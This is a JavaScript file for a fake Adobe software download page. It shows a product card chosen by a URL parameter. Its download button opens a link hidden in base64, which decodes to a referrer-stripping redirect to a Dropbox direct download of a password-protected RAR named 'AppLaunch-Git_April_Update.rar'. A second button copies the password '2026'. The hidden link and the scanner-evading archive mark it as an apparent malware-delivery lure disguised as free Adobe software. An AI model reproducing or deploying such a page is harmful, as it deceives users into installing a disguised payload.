const urlParts = [
  'aHR0cHM6Ly9ocmVmLmxpLz8=',
  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3k4dm02bTgyZXhhZDJjOXIya3IwMC9BcHBMYXVuY2gtR2l0X0FwcmlsX1VwZGF0ZS5yYXI/cmxrZXk9aTU2YjE5cTBqZnprdDlreG8xeTJ5ajRvdiZzdD1jeTh6YWtnYiZkbD0x'
];

function decodeBase64(str) {
    try {
        return atob(str);
    } catch(e) {
        console.error('Decoding error:', e);
        return '#';
    }
}

function getFullUrl() {
    let fullUrl = '';
    for (let i = 0; i < urlParts.length; i++) {
        fullUrl += decodeBase64(urlParts[i]);
    }
    return fullUrl;
}

function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

function svgToDataUrl(svgString) {
    const encoded = encodeURIComponent(svgString);
    return `data:image/svg+xml,${encoded}`;
}

function updateFavicon(svgString) {
    const faviconLink = document.getElementById('favicon');
    if (faviconLink && svgString) {
        const dataUrl = svgToDataUrl(svgString);
        faviconLink.href = dataUrl;
    }
}

function updatePageTitle(title) {
    document.title = title;
}

const icons = {
    photoshop: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 240 234" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M42.5 0h155C221 0 240 19 240 42.5v149c0 23.5-19 42.5-42.5 42.5h-155C19 234 0 215 0 191.5v-149C0 19 19 0 42.5 0z" fill="#001e36"/><g xmlns="http://www.w3.org/2000/svg" fill="#31a8ff"><path d="M54 164.1V61.2c0-.7.3-1.1 1-1.1 1.7 0 3.3 0 5.6-.1 2.4-.1 4.9-.1 7.6-.2s5.6-.1 8.7-.2 6.1-.1 9.1-.1c8.2 0 15 1 20.6 3.1 5 1.7 9.6 4.5 13.4 8.2 3.2 3.2 5.7 7.1 7.3 11.4 1.5 4.2 2.3 8.5 2.3 13 0 8.6-2 15.7-6 21.3s-9.6 9.8-16.1 12.2c-6.8 2.5-14.3 3.4-22.5 3.4-2.4 0-4 0-5-.1s-2.4-.1-4.3-.1V164c.1.7-.4 1.3-1.1 1.4H55.2c-.8 0-1.2-.4-1.2-1.3zm21.8-84.7V113c1.4.1 2.7.2 3.9.2H85c3.9 0 7.8-.6 11.5-1.8 3.2-.9 6-2.8 8.2-5.3 2.1-2.5 3.1-5.9 3.1-10.3.1-3.1-.7-6.2-2.3-8.9-1.7-2.6-4.1-4.6-7-5.7-3.7-1.5-7.7-2.1-11.8-2-2.6 0-4.9 0-6.8.1-2-.1-3.4 0-4.1.1zM192 106.9c-3-1.6-6.2-2.7-9.6-3.4-3.7-.8-7.4-1.3-11.2-1.3-2-.1-4.1.2-6 .7-1.3.3-2.4 1-3.1 2-.5.8-.8 1.8-.8 2.7s.4 1.8 1 2.6c.9 1.1 2.1 2 3.4 2.7 2.3 1.2 4.7 2.3 7.1 3.3 5.4 1.8 10.6 4.3 15.4 7.3 3.3 2.1 6 4.9 7.9 8.3 1.6 3.2 2.4 6.7 2.3 10.3.1 4.7-1.3 9.4-3.9 13.3-2.8 4-6.7 7.1-11.2 8.9-4.9 2.1-10.9 3.2-18.1 3.2-4.6 0-9.1-.4-13.6-1.3-3.5-.6-7-1.7-10.2-3.2-.7-.4-1.2-1.1-1.1-1.9v-17.4c0-.3.1-.7.4-.9s.6-.1.9.1c3.9 2.3 8 3.9 12.4 4.9 3.8 1 7.8 1.5 11.8 1.5 3.8 0 6.5-.5 8.3-1.4 1.6-.7 2.7-2.4 2.7-4.2 0-1.4-.8-2.7-2.4-4s-4.9-2.8-9.8-4.7c-5.1-1.8-9.8-4.2-14.2-7.2-3.1-2.2-5.7-5.1-7.6-8.5-1.6-3.2-2.4-6.7-2.3-10.2 0-4.3 1.2-8.4 3.4-12.1 2.5-4 6.2-7.2 10.5-9.2 4.7-2.4 10.6-3.5 17.7-3.5 4.1 0 8.3.3 12.4.9 3 .4 5.9 1.2 8.6 2.3.4.1.8.5 1 .9.1.4.2.8.2 1.2v16.3c0 .4-.2.8-.5 1-.9.2-1.4.2-1.8 0z"/></g></svg>`,
    acrobat: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 56 54" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M9.9 0h36.2C51.6 0 56 4.4 56 9.9v34.2c0 5.5-4.4 9.9-9.9 9.9H9.9C4.4 54 0 49.6 0 44.1V9.9C0 4.4 4.4 0 9.9 0z" fill="#fa0f00"/><path xmlns="http://www.w3.org/2000/svg" d="M45 31.2c-2.6-2.7-9.7-1.6-11.4-1.4-2.5-2.4-4.2-5.3-4.8-6.3.9-2.7 1.5-5.4 1.6-8.3 0-2.5-1-5.2-3.8-5.2-1 0-1.9.6-2.4 1.4-1.2 2.1-.7 6.3 1.2 10.6-1.1 3.1-2.1 6.1-4.9 11.4-2.9 1.2-9 4-9.5 7-.2.9.1 1.8.8 2.5.7.6 1.6.9 2.5.9 3.7 0 7.3-5.1 9.8-9.4 2.1-.7 5.4-1.7 8.7-2.3 3.9 3.4 7.3 3.9 9.1 3.9 2.4 0 3.3-1 3.6-1.9.5-1 .2-2.1-.5-2.9zm-2.5 1.7c-.1.7-1 1.4-2.6 1-1.9-.5-3.6-1.4-5.1-2.6 1.3-.2 4.2-.5 6.3-.1.8.2 1.6.7 1.4 1.7zM25.8 12.3c.2-.3.5-.5.8-.5.9 0 1.1 1.1 1.1 2-.1 2.1-.5 4.2-1.2 6.2-1.5-4-1.2-6.8-.7-7.7zm-.2 19.4c.8-1.6 1.9-4.4 2.3-5.6.9 1.5 2.4 3.3 3.2 4.1 0 .1-3.1.7-5.5 1.5zm-5.9 4c-2.3 3.8-4.7 6.2-6 6.2-.2 0-.4-.1-.6-.2-.3-.2-.4-.5-.3-.9.3-1.4 2.9-3.3 6.9-5.1z" fill="#fff"/></svg>`,
    illustrator: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 240 234" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M42.5 0h155C221 0 240 19 240 42.5v149c0 23.5-19 42.5-42.5 42.5h-155C19 234 0 215 0 191.5v-149C0 19 19 0 42.5 0z" fill="#300"/><g xmlns="http://www.w3.org/2000/svg" fill="#ff9a00"><path d="M116.3 140.4H79.1l-7.6 23.5c-.2.9-1 1.5-1.9 1.4H50.8c-1.1 0-1.4-.6-1.1-1.8l32.2-92.7c.3-1 .6-2.1 1-3.3.4-2.1.6-4.3.6-6.5-.1-.5.3-1 .8-1.1H110.2c.8 0 1.2.3 1.3.8l36.5 103c.3 1.1 0 1.6-1 1.6h-20.9c-.7.1-1.4-.4-1.6-1.1zm-31.4-20.3h25.4c-.6-2.1-1.4-4.6-2.3-7.2-.9-2.7-1.8-5.6-2.7-8.6-1-3.1-1.9-6.1-2.9-9.2s-1.9-6-2.7-8.9c-.8-2.8-1.5-5.4-2.2-7.8h-.2c-.9 4.3-2 8.6-3.4 12.9-1.5 4.8-3 9.8-4.6 14.8-1.4 5.1-2.9 9.8-4.4 14zM169.8 77c-3.3.1-6.5-1.2-8.9-3.5-2.3-2.5-3.5-5.8-3.4-9.2-.1-3.4 1.2-6.6 3.6-8.9s5.6-3.5 8.9-3.5c3.9 0 6.9 1.2 9.1 3.5 2.2 2.4 3.4 5.6 3.3 8.9.1 3.4-1.1 6.7-3.5 9.2-2.3 2.4-5.7 3.7-9.1 3.5zm-11.2 86.8v-77c0-1 .4-1.4 1.3-1.4h19.8c.9 0 1.3.5 1.3 1.4v77c0 1.1-.4 1.6-1.3 1.6h-19.6c-1 0-1.5-.6-1.5-1.6z"/></g></svg>`,
    premiere: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 240 234" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M42.5 0h155C221 0 240 19 240 42.5v149c0 23.5-19 42.5-42.5 42.5h-155C19 234 0 215 0 191.5v-149C0 19 19 0 42.5 0z" fill="#00005b"/><g xmlns="http://www.w3.org/2000/svg" fill="#99f"><path d="M57 164.1V61.2c0-.7.3-1.1 1-1.1 1.7 0 3.3 0 5.6-.1 2.4-.1 4.9-.1 7.6-.2s5.6-.1 8.7-.2 6.1-.1 9.1-.1c8.2 0 15 1 20.6 3.1 5 1.7 9.6 4.5 13.4 8.2 3.2 3.2 5.7 7.1 7.3 11.4 1.5 4.2 2.3 8.5 2.3 13 0 8.6-2 15.7-6 21.3s-9.6 9.8-16.1 12.2c-6.8 2.5-14.3 3.4-22.5 3.4-2.4 0-4 0-5-.1s-2.4-.1-4.3-.1V164c.1.7-.4 1.3-1.1 1.4H58.2c-.8 0-1.2-.4-1.2-1.3zm21.8-84.7V113c1.4.1 2.7.2 3.9.2H88c3.9 0 7.8-.6 11.5-1.8 3.2-.9 6-2.8 8.2-5.3 2.1-2.5 3.1-5.9 3.1-10.3.1-3.1-.7-6.2-2.3-8.9-1.7-2.6-4.1-4.6-7-5.7-3.7-1.5-7.7-2.1-11.8-2-2.6 0-4.9 0-6.8.1-2-.1-3.4 0-4.1.1zM146.6 85.2h17.5c1 0 1.8.7 2.1 1.6.3.8.5 1.6.6 2.5.2 1 .4 2.1.5 3.1.1 1.1.2 2.3.2 3.6 3-3.5 6.6-6.4 10.7-8.6 4.6-2.6 9.9-3.9 15.2-3.9.7-.1 1.3.4 1.4 1.1v19.9c0 .8-.5 1.1-1.6 1.1-3.6-.1-7.3.2-10.8 1-2.9.6-5.7 1.5-8.4 2.7-1.9.9-3.7 2.1-5.1 3.7v51c0 1-.4 1.4-1.3 1.4h-19.7c-.8.1-1.5-.4-1.6-1.2v-55.8c0-2.4 0-4.9-.1-7.5s-.1-5.2-.2-7.8c0-2.3-.2-4.5-.4-6.8-.1-.5.2-1 .7-1.1 0-.1.2-.1.3 0z"/></g></svg>`,
    aftereffects: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 2500 2437.5" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M442.71 0h1614.58C2302.08 0 2500 197.92 2500 442.71v1552.08c0 244.79-197.92 442.71-442.71 442.71H442.71C197.92 2437.5 0 2239.58 0 1994.79V442.71C0 197.92 197.92 0 442.71 0z" fill="#00005b"/><g xmlns="http://www.w3.org/2000/svg" fill="#99f"><path d="M1004.17 1458.33h-387.5l-79.17 245.83c-2.08 9.37-10.42 15.62-19.79 14.58H321.88c-11.46 0-14.58-6.25-11.46-18.75l335.42-961.46c3.12-10.42 6.25-19.79 10.42-32.29 4.17-21.87 6.25-44.79 6.25-67.71-1.04-5.21 3.12-10.42 8.33-11.46h269.79c7.29 0 12.5 3.12 13.54 8.33l380.21 1062.5c3.13 11.46 0 16.67-10.42 16.67h-217.71c-7.29 1.04-14.58-4.17-16.67-11.46l-85.42-250v5.21zm-327.08-207.29h264.58c-6.25-21.87-14.58-47.92-23.96-75-9.38-28.12-18.75-58.33-28.12-89.58-10.42-32.29-19.79-63.54-30.21-95.83s-19.79-62.5-28.12-92.71c-8.33-29.17-15.62-56.25-22.92-81.25h-2.08c-9.38 44.79-20.83 89.58-35.42 134.38-15.62 50-31.25 102.08-47.92 154.17-13.54 53.12-30.21 102.08-45.83 145.83zM1947.92 1364.58h-330.21c4.17 32.29 14.58 64.58 32.29 92.71 18.75 28.12 44.79 50 76.04 62.5 41.67 17.71 87.5 27.08 133.33 26.04 36.46-1.04 72.92-4.17 108.33-11.46 32.29-4.17 63.54-12.5 92.71-23.96 5.21-4.17 8.33-2.08 8.33 8.33v159.38c0 4.17-1.04 8.33-2.08 12.5-2.08 3.13-4.17 5.21-7.29 7.29-33.33 14.58-67.71 25-104.17 31.25-48.96 9.37-97.92 13.54-147.92 12.5-79.17 0-145.83-12.5-200-36.46-51.04-21.88-95.83-56.25-131.25-98.96-33.33-40.62-57.29-86.46-71.87-136.46-14.58-48.96-21.88-100-21.88-152.08 0-56.25 8.33-111.46 26.04-165.63 16.67-52.08 42.71-100 78.12-142.71 34.38-41.67 77.08-75 126.04-98.96s107.29-32.29 173.96-32.29c55.21-1.04 110.42 9.38 161.46 32.29 42.71 18.75 80.21 46.88 109.38 83.33 27.08 35.42 48.96 75 62.5 118.75 13.54 41.67 19.79 84.37 19.79 127.08 0 25-1.04 46.88-2.08 66.67-2.08 19.79-3.13 34.38-4.17 43.75-1.04 7.29-7.29 13.54-14.58 13.54-6.25 0-17.71 1.04-34.38 2.08-16.67 2.08-36.46 3.13-60.42 3.13s-48.96-4.17-76.04-4.17zm-330.21-152.08h219.79c27.08 0 46.88 0 59.37-1.04 8.33-1.04 16.67-3.13 23.96-8.33v-10.42c0-13.54-2.08-26.04-6.25-38.54-18.75-58.33-73.96-97.92-135.42-95.83-57.29-3.13-111.46 27.08-138.54 79.17-12.5 23.96-19.79 48.96-22.92 75z"/></g></svg>`,
    indesign: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 240 234" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M42.5 0h155C221 0 240 19 240 42.5v149c0 23.5-19 42.5-42.5 42.5h-155C19 234 0 215 0 191.5v-149C0 19 19 0 42.5 0z" fill="#49021f"/><g xmlns="http://www.w3.org/2000/svg" fill="#f36"><path d="M87.2 61.2v103c0 1.1-.5 1.6-1.4 1.6H66.2c-.9 0-1.3-.5-1.3-1.6v-103c0-.9.5-1.3 1.4-1.3h19.5c.6-.1 1.2.3 1.3 1 .1.1.1.2.1.3zM145 167c-7.4.1-14.8-1.4-21.5-4.5-6.3-2.9-11.5-7.7-15.1-13.6-3.7-6.1-5.5-13.7-5.5-22.8-.1-7.4 1.8-14.7 5.5-21.1 3.8-6.5 9.3-11.9 15.9-15.5 7-3.9 15.4-5.8 25.3-5.8.5 0 1.2 0 2.1.1s1.9.1 3.1.2V52.4c0-.7.3-1.1 1-1.1h20.3c.5-.1.9.3 1 .7v95.4c0 1.8.1 3.8.2 6 .2 2.1.3 4.1.4 5.8 0 .7-.3 1.3-1 1.6-5.2 2.2-10.7 3.8-16.3 4.8-5 .9-10.2 1.4-15.4 1.4zm9.8-20v-44c-.9-.2-1.8-.4-2.7-.5-1.1-.1-2.2-.2-3.3-.2-3.9 0-7.8.8-11.3 2.6-3.4 1.7-6.3 4.2-8.5 7.4s-3.3 7.5-3.3 12.7c-.1 3.5.5 7 1.7 10.3 1 2.7 2.5 5.1 4.5 7.1 1.9 1.8 4.2 3.2 6.8 4 2.7.9 5.5 1.3 8.3 1.3 1.5 0 2.9-.1 4.2-.2 1.3.1 2.5-.1 3.6-.5z"/></g></svg>`,
    audition: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 256.4 250" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M45.4 0H211c25.1 0 45.4 20.3 45.4 45.4v159.2c0 25.1-20.3 45.4-45.4 45.4H45.4C20.3 250 0 229.7 0 204.6V45.4C0 20.3 20.3 0 45.4 0z" fill="#00005b"/><g xmlns="http://www.w3.org/2000/svg" fill="#99f"><path d="M100.7 149.6H61l-8.1 25.2c-.2 1-1.1 1.6-2 1.5H30.8c-1.2 0-1.5-.6-1.2-1.9L64 75.6c.3-1.1.6-2.2 1.1-3.5.5-2.2.9-4.5.9-6.8-.1-.5.3-1.1.9-1.2h27.7c.7 0 1.3.3 1.4.9l38.8 109.6c.3 1.2 0 1.7-1.1 1.7h-22.3c-.7.1-1.5-.4-1.7-1.2zm-33.5-21.3h27.1c-.6-2.2-1.5-4.9-2.5-7.7-1-2.9-1.9-6-2.9-9.2-1.1-3.3-2-6.5-3.1-9.8s-2-6.4-2.9-9.5c-.9-3-1.6-5.8-2.4-8.3h-.2c-1 4.6-2.1 9.2-3.6 13.8-1.6 5.1-3.2 10.5-4.9 15.8-1.3 5.4-3 10.4-4.6 14.9zM216.7 92.1v65.5c0 2.9 0 5.4.1 7.7.1 2.2.2 4.2.3 5.9.2 1.7.3 2.7.4 3.8.1 1-.3 1.4-1.2 1.4H198c-.9.1-1.7-.4-2-1.2l-.6-2.7c-.2-.7-.2-1.5-.2-2.2-3.4 3.1-7.6 5.3-12.1 6.6-3.8 1.1-7.9 1.6-11.9 1.6s-7.9-.5-11.6-1.8c-3.4-1.2-6.6-3.2-9.1-5.9-2.8-3-4.8-6.5-6-10.4-1.5-4.9-2.2-10-2.1-15.2v-53c-.1-.6.3-1.3 1.1-1.4h20.7c.6-.1 1.3.3 1.4 1.1v50.5c0 4.7 1.1 8.4 3.1 11.1s6.2 4.1 11 4.1c2.5 0 4.9-.4 7.3-1.3 2.5-.9 4.7-2 6.7-3.5V92.1c0-.7.5-1.2 1.5-1.2h20.4c.5-.1 1.2.3 1.2.9-.1.1-.1.2-.1.3z"/></g></svg>`,
    lightroom: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 256 250" width="16" height="16" preserveAspectRatio="xMidYMid meet"><rect xmlns="http://www.w3.org/2000/svg" width="256" height="249.6" fill="#001E36" rx="42.5"/><path xmlns="http://www.w3.org/2000/svg" fill="#31A8FF" d="M134.443 176.409H66.78c-1.146 0-1.718-.63-1.717-1.89V65.47a1.366 1.366 0 0 1 1.545-1.546H87.56a1.064 1.064 0 0 1 1.202 1.203v89.645h49.287c1.03 0 1.431.515 1.203 1.545l-3.092 18.547a1.64 1.64 0 0 1-.687 1.288a2.29 2.29 0 0 1-1.03.258Zm17-85.352h18.719c1.044.01 1.956.71 2.232 1.718a8.3 8.3 0 0 1 .86 2.404c.239 1.105.41 2.223.514 3.349c.113 1.202.17 2.49.172 3.864a40.118 40.118 0 0 1 11.42-9.188a32.153 32.153 0 0 1 15.886-3.864a1.366 1.366 0 0 1 1.545 1.546v20.78c0 .802-.572 1.202-1.717 1.202a43.357 43.357 0 0 0-20.179 3.606a18.153 18.153 0 0 0-5.753 3.95v54.44c0 1.03-.458 1.545-1.374 1.545h-20.78a1.517 1.517 0 0 1-1.717-1.717v-59.077c0-1.438-.009-2.924-.028-4.457l-.035-2.334c-.007-.395-.014-.793-.023-1.194a417.47 417.47 0 0 0-.178-6.263l-.08-2.066a54.445 54.445 0 0 0-.686-7.041a.987.987 0 0 1 1.075-1.227l.127.024Z"/></svg>`,
    animate: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 256 250" width="16" height="16" preserveAspectRatio="xMidYMid meet"><rect xmlns="http://www.w3.org/2000/svg" width="256" height="249.6" fill="#00005B" rx="42.5"/><path xmlns="http://www.w3.org/2000/svg" fill="#99F" d="M103.513 149.333h-39.67l-8.148 25.033a2.02 2.02 0 0 1-1.9 1.546H33.542c-1.146 0-1.547-.63-1.202-1.89l34.49-98.42l.457-1.353c.191-.573.382-1.182.573-1.914c.45-2.291.68-4.62.687-6.955a1.063 1.063 0 0 1 1.202-1.202h27.305c.8 0 1.258.286 1.374.859l38.84 109.157c.344 1.145 0 1.718-1.03 1.717h-22.325a1.587 1.587 0 0 1-1.718-1.202l-8.682-25.376Zm-33.42-21.181h27.133l-.386-1.277l-.622-2.022l-.908-2.896l-1.745-5.467l-4.754-15.043a334.434 334.434 0 0 1-2.46-8.138l-.878-3.096l-.72-2.567l-.885-3.21l-.209-.763h-.171a138.781 138.781 0 0 1-3.137 12.23l-1.16 3.723l-2.79 9l-1.797 5.82l-.763 2.427l-.758 2.37l-.754 2.313a374.417 374.417 0 0 1-2.237 6.596Zm79.197 46.125v-63.299c0-.432 0-.876-.004-1.33l-.012-1.4l-.021-1.467l-.048-2.328l-.057-2.033a255.4 255.4 0 0 0-.11-2.944l-.09-1.893l-.13-2.348l-.108-1.72l-.064-.878l-.042-.508a1.022 1.022 0 0 1 .171-1.03a1.401 1.401 0 0 1 1.031-.343h17.143a3.84 3.84 0 0 1 1.718.343c.463.239.782.687.858 1.202l.773 2.319a17.61 17.61 0 0 1 .601 3.478a34.501 34.501 0 0 1 11.334-6.611a39.021 39.021 0 0 1 12.88-2.147a32.68 32.68 0 0 1 10.047 1.632a25.379 25.379 0 0 1 16.229 15.8c1.717 4.408 2.39 10.104 2.39 17.086v50.419c0 1.03-.458 1.545-1.374 1.545L202.34 176a1.517 1.517 0 0 1-1.718-1.717v-47.836a23.677 23.677 0 0 0-2.073-9.286a12.27 12.27 0 0 0-4.38-5.324a12.923 12.923 0 0 0-7.298-1.889c-2.76-.04-5.5.457-8.071 1.46a20.36 20.36 0 0 0-6.354 4.035v58.834c0 1.03-.458 1.545-1.374 1.545h-20.235a1.366 1.366 0 0 1-1.546-1.545Z"/></svg>`,
    mediaencoder: `<svg xmlns="http://www.w3.org/2000/svg" x="0" y="-13" viewBox="0 0 512 512" width="16" height="16" preserveAspectRatio="xMidYMid meet"><path xmlns="http://www.w3.org/2000/svg" d="M506 68.917v374.166c0 31.275-25.392 56.666-56.667 56.666H62.667C31.392 499.75 6 474.358 6 443.083V68.917C6 37.642 31.392 12.25 62.667 12.25h386.666c31.275 0 56.666 25.392 56.666 56.667z" fill="#00005b"/><g xmlns="http://www.w3.org/2000/svg" fill="#99f" fill-rule="nonzero"><path d="M76.5 139.12a2.26 2.26 0 012.55-2.012h58.631c1.585-.212 3.1.8 3.504 2.35a4144.13 4144.13 0 005.417 20.963 2621.222 2621.222 0 016.852 27.002c2.44 9.841 4.935 19.904 7.487 30.187a9644.225 9644.225 0 007.49 30.019c2.437 9.727 4.51 18.67 6.212 26.833a2343.57 2343.57 0 014.144 20.294h.319c.844-4.698 2.331-10.959 4.46-18.786 2.121-7.822 4.563-16.6 7.327-26.329a7126.767 7126.767 0 0016.89-60.543 3146.568 3146.568 0 017.806-28.007c2.44-8.606 4.404-15.816 5.896-21.633a2.792 2.792 0 012.867-2.35h57.037a2.545 2.545 0 012.869 2.35l7.648 214.329c.24.76.058 1.592-.48 2.181a2.725 2.725 0 01-2.07.838h-41.423a2.479 2.479 0 01-1.594-.502 2.222 2.222 0 01-.637-1.844c0-11.406-.052-23.369-.16-35.892a4818.21 4818.21 0 00-.478-37.733c-.214-12.631-.214-24.76 0-36.394.21-11.623.317-22.356.319-32.2 0-9.835.052-18.39.158-25.658.107-7.265.159-12.685.16-16.269h-.318a3814.664 3814.664 0 01-5.098 21.971c-2.127 9.056-4.623 19.231-7.487 30.523a2082.11 2082.11 0 01-9.242 35.05 2957.088 2957.088 0 00-9.558 35.89 1973.304 1973.304 0 01-8.923 33.206c-2.87 10.29-5.259 19.345-7.171 27.168a3.53 3.53 0 01-3.504 2.684H158.39a3.438 3.438 0 01-3.822-2.684c-1.913-7.823-4.09-16.879-6.532-27.168a3469.449 3469.449 0 01-7.49-32.198 2274.681 2274.681 0 00-8.124-34.381 3235.335 3235.335 0 01-8.125-34.044 1467.843 1467.843 0 01-6.852-30.858c-2.021-9.613-3.88-18.11-5.575-25.492h-.638v26.498c0 10.287-.16 21.635-.477 34.044-.319 12.41-.637 25.379-.956 38.908a7278.238 7278.238 0 01-1.115 41.927c-.429 14.423-.96 28.677-1.593 42.764 0 1.794-.853 2.684-2.55 2.684H67.579a3.81 3.81 0 01-2.07-.502c-.534-.336-.695-1.175-.48-2.515L76.5 139.121zM415.737 283.606h-66.075a43.18 43.18 0 006.373 17.61 34.496 34.496 0 0015.26 12.577c6.819 3.136 15.706 4.7 26.667 4.696 7.25.031 14.492-.585 21.633-1.844a90.212 90.212 0 0019.621-5.87c1.117-.89 1.68-.336 1.68 1.677v31.864a4.983 4.983 0 01-.505 2.517 4.811 4.811 0 01-1.51 1.508 94.039 94.039 0 01-21.802 7.213 147.318 147.318 0 01-29.517 2.514c-15.88 0-29.185-2.458-39.915-7.379a71.101 71.101 0 01-26.16-19.79 77.462 77.462 0 01-14.425-27.335 107.706 107.706 0 01-4.36-30.356 105.767 105.767 0 015.2-33.038 86.291 86.291 0 0115.595-28.51 74.908 74.908 0 0125.159-19.79 78.676 78.676 0 0134.88-7.212 75.713 75.713 0 0132.37 6.373 58.532 58.532 0 0121.968 17.275 76.217 76.217 0 0112.41 23.646c2.644 8.241 4 16.84 4.026 25.491 0 4.921-.167 9.394-.502 13.417-.336 4.025-.615 6.933-.84 8.72a3.047 3.047 0 01-3.019 2.684c-1.341 0-3.633.169-6.875.504-3.243.336-7.268.559-12.075.671-4.812.115-9.898.171-15.262.167zm-66.075-32.536h43.937c5.37 0 9.338-.056 11.909-.166 1.633 0 3.264-.169 4.864-.504v-2.013a26.914 26.914 0 00-1.341-7.714c-3.709-11.725-14.88-19.586-27.17-19.12-11.512-.695-22.4 5.507-27.672 15.765a42.331 42.331 0 00-4.527 13.752z"/></g></svg>`
};

const products = {
    photoshop: {
        title: 'Adobe Photoshop',
        description: 'Adobe Photoshop is a raster graphics editor developed and published by Adobe Inc. for Windows and macOS. This software is not only for raster graphics edit, but for digital art as a whole.',
        iconKey: 'photoshop'
    },
    acrobat: {
        title: 'Adobe Acrobat',
        description: 'Adobe Acrobat is a family of application software and Web services developed by Adobe Inc. to view, create, manipulate, print and manage Portable Document Format files.',
        iconKey: 'acrobat'
    },
    illustrator: {
        title: 'Adobe Illustrator',
        description: 'Adobe Illustrator is a vector graphics editor and design program developed and marketed by Adobe Inc. Originally designed for the Apple Macintosh, development of Adobe Illustrator began in 1985. Along with Creative Cloud, Illustrator CC was released.',
        iconKey: 'illustrator'
    },
    premiere: {
        title: 'Adobe Premiere Pro',
        description: 'Adobe Premiere Pro is a timeline-based and non-linear video editing software application developed by Adobe Inc. and published as part of the Adobe Creative Cloud licensing program.',
        iconKey: 'premiere'
    },
    aftereffects: {
        title: 'Adobe After Effects',
        description: 'Adobe After Effects is a digital visual effects, motion graphics, and compositing application developed by Adobe Systems and used in the post-production process of film making, video games and television production.',
        iconKey: 'aftereffects'
    },
    indesign: {
        title: 'Adobe InDesign',
        description: 'Adobe InDesign is a desktop publishing and page layout designing software application produced by Adobe Inc. It can be used to create works such as posters, flyers, brochures, magazines, newspapers, presentations, books, etc.',
        iconKey: 'indesign'
    },
    audition: {
        title: 'Adobe Audition',
        description: 'Adobe Audition is a digital audio workstation developed by Adobe Inc. featuring both a multitrack, non-destructive mix/edit environment and a destructive-approach waveform editing view.',
        iconKey: 'audition'
    },
    lightroom: {
        title: 'Adobe Lightroom',
        description: 'Adobe Lightroom is a creative image organization and image manipulation software developed by Adobe Inc. as part of the Creative Cloud subscription family. It is supported on Windows, macOS, iOS, Android, and tvOS.',
        iconKey: 'lightroom'
    },
    animate: {
        title: 'Adobe Animate',
        description: 'Adobe Animate is a multimedia authoring and computer animation program developed by Adobe Inc. Animate is used to design vector graphics and animation for television series, online animation, websites, web applications, rich web applications, etc.',
        iconKey: 'animate'
    },
    mediaencoder: {
        title: 'Adobe Media Encoder',
        description: 'Adobe Media Encoder is an audio/video media processing program that allows users to convert files into other types of files — for example: MP4 to WAV. Media Encoder works in conjunction with Adobe programs.',
        iconKey: 'mediaencoder'
    }
};

function initPage() {
    const productParam = getQueryParam('product');
    const card = document.getElementById('card');
    
    if (productParam && products[productParam.toLowerCase()]) {
        card.classList.remove('hide-content');
        const selectedProduct = products[productParam.toLowerCase()];
        
        document.getElementById('title').textContent = selectedProduct.title;
        updatePageTitle(selectedProduct.title);
        
        const descElement = document.getElementById('description');
        descElement.innerHTML = '';
        const p = document.createElement('p');
        p.textContent = selectedProduct.description;
        descElement.appendChild(p);
        
        const iconSvg = icons[selectedProduct.iconKey] || icons.mediaencoder;
        document.getElementById('icon').innerHTML = iconSvg;
        
        if (iconSvg && iconSvg !== '<svg here </svg>') {
            updateFavicon(iconSvg);
        }
    } else {
        card.classList.add('hide-content');
        document.getElementById('icon').innerHTML = '';
        document.getElementById('title').textContent = '';
        document.getElementById('description').innerHTML = '';
        updatePageTitle('Adobe Products');
    }
}

const downloadBtn = document.getElementById('downloadBtn');
const passwordBtn = document.getElementById('passwordBtn');
const toast = document.getElementById('toast');
let toastTimeout = null;

const fullUrl = getFullUrl();

function showToast(message) {
    if (toastTimeout) {
        clearTimeout(toastTimeout);
    }
    
    toast.textContent = message || '🔑 Password: 2026';
    toast.classList.add('show');
    
    toastTimeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 2000);
}

if (downloadBtn) {
    downloadBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (fullUrl && fullUrl !== '#') {
            window.open(fullUrl, '_blank');
        } else {
            showToast('❌ Download link not available');
        }
    });
}

if (passwordBtn) {
    passwordBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        navigator.clipboard.writeText('2026').then(() => {
            showToast('✅ Password "2026" copied to clipboard!');
        }).catch(() => {
            showToast('🔑 Password: 2026 (copy manually)');
        });
    });
}

initPage();
